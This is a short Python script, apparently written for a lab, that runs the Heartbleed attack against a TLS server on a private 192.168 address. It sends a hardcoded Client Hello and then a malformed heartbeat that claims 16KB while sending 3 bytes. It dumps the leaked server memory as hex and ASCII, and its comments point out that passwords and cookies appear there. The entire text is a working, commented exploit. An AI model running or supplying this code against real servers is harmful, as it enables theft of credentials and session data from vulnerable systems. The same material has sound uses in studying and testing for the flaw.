import socket
import time

# --- CONFIGURATION ---
TARGET_HOST = "192.168...."
TARGET_PORT = 443

# Minimal TLS Client Hello packet (TLS 1.2/1.1 compatible)
# This is required to initiate a session before sending the heartbeat.
# Without this "handshake," the server would reject the malformed packet.
client_hello = (
    b"\x16\x03\x02\x00\x31\x01\x00\x00\x2d\x03\x02\x50\x0b\xaf\xbb\xb7"
    b"\x5a\x02\x3b\xfd\xc0\xff\x01\xad\x02\x42\x28\x91\xd1\x39\x69\x6a"
    b"\x28\x1a\x12\x60\x07\x3c\xed\xac\xfc\x3f\xfc\x00\x00\x04\x00\x33"
    b"\x00\xff\x01\x00\x00\x00"
)

# The Heartbleed Malformed Request
# Structure: Type (0x18 - Heartbeat), Version (0x0302 - TLS 1.1), 
# Length (0x0003), Payload Type (0x01), Payload Length (0x4000 = 16KB).
# The exploit: we claim the payload is 16KB, but we only send 3 bytes.
hb_payload = b"\x18\x03\x02\x00\x03\x01\x40\x00"

def pwn_kali():
    """Executes the Heartbleed attack against the specified target."""
    
    # Initialize a standard TCP socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5) # Prevents the script from hanging if the server is unresponsive
    
    try:
        # Establish connection to the target server
        print(f"[*] Connecting to {TARGET_HOST}:{TARGET_PORT}...")
        s.connect((TARGET_HOST, TARGET_PORT))
        
        # --- PHASE 1: Handshake ---
        # We must "introduce" ourselves as a legitimate client first.
        print("[*] Sending Client Hello...")
        s.send(client_hello)
        
        # Wait for the server to respond with its Certificate (Server Hello).
        # We receive and ignore this data; we just need the tunnel to stay open.
        time.sleep(0.5)
        s.recv(4096) 
        
        # --- PHASE 2: Attack ---
        # Now we trigger the vulnerability by sending the malformed Heartbeat.
        print("[*] Sending malformed Heartbeat request...")
        s.send(hb_payload)
        
        # --- PHASE 3: Data Retrieval ---
        # The server reads beyond our sent data and returns chunks of its RAM.
        response = s.recv(16384) # Attempt to read 16KB of returned memory
        
        if response:
            print(f"[+] SUCCESS! Received {len(response)} bytes.")
            
            # Print raw hexadecimal data for analysis
            print("\n--- HEXADECIMAL DUMP ---")
            print(response.hex()) 
            
            # Print ASCII representation, ignoring non-printable binary characters.
            # This is where sensitive info like passwords or cookies will appear.
            print("\n--- ASCII CONTENT ---")
            print(response.decode('ascii', errors='ignore'))
        else:
            print("[-] No response received. The server might not be vulnerable.")
        
    except Exception as e:
        print(f"[-] An error occurred: {e}")
    finally:
        # Always close the connection to avoid resource leakage
        s.close()

if __name__ == "__main__":
    pwn_kali()
